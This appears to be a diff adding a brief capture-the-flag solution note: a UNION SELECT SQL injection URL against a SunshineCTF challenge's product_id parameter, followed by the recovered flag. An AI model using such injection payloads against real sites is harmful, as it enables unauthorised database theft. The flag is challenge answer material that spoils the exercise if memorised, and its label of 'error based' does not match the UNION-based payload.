@@ -1,0 +1,3 @@
+Payload : https://meteor.sunshinectf.games/product?product_id=1 UNION SELECT 1, 2, flag, 4 FROM flag
+
+sun{baby_SQL_injection_this_is_known_as_error_based_SQL_injection_8767289082762892}
